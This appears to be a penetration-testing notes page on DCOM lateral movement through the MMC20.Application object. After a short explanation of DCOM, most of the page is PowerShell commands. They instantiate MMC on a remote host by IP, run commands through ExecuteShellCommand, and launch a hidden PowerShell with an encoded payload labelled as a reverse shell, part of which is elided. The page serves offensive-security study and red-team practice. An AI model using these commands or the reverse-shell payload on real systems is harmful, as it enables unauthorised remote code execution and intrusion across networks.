---
description: >-
  Component Object Model (COM) is a system for creating software components that
  interact with each other. DCOM was introduced to interact with multiple
  computers over a network.
---

# DCOM



## Distributed Component Object Model (DCOM)

The Distributed Component Object Model (DCOM) was introducted to allow COM objects to interact with other computers over a network. DCOM operates over RPC, port 135. Local Administrator privileges are required call DCOM objects.





## Microsoft Management Console (MMC) Technique

We will go over a technique that utilizes the Microsoft management Console (MMC) for lateral movement.



### How it works

The MMC class allows the action of creation of Application Objects, which exposes the _ExecuteShellCommand_. This method allows us to execute an abitrary shell command.

### Lateral Movement

#### Instantiate MMC:

<pre class="language-powershell"><code class="lang-powershell"><strong>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
</strong></code></pre>

Pass Arguments to $dcom variable

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

#### Execute Reverse Shell

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

{% embed url="https://www.cybereason.com/blog/dcom-lateral-movement-techniques" %}
